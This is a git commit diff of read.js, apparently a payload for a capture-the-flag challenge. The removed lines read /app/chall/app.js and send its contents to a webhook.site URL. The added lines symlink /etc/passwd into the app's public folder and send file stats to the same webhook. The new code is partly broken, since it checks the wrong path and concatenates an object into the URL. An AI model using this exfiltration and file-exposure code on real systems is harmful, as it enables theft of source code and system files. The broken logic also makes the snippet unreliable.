28c64c3e64733241b183b8b412b3c4bbfab108ff
Abdul Wassay <57496383+hotplugin0x01@users.noreply.github.com>
2024-12-14 11:13:00 +0500

    Update read.js

--- read.js
+++ read.js
@@ -1,5 +1,13 @@
-require('fs').readFile('/app/chall/app.js', (err, data) => {
-  if (!err) {
-    fetch('https://webhook.site/ff07d904-39d0-4e1e-94ef-ca7e055d5538?flag=' + encodeURIComponent(data.toString()));
-  }
-});
+
+const fs = require('fs'); 
+  
+fs.symlinkSync("/etc/passwd", "/app/chall/public/passwd", 'file'); 
+console.log("Symlink to file created") 
+  
+fs.lstat("symlinkToFile", (err, stats) => { 
+  if (err) 
+    console.log(err); 
+  else { 
+    fetch("https://webhook.site/ff07d904-39d0-4e1e-94ef-ca7e055d5538" + encodeURIComponent(stats));
+  } 
+}); 
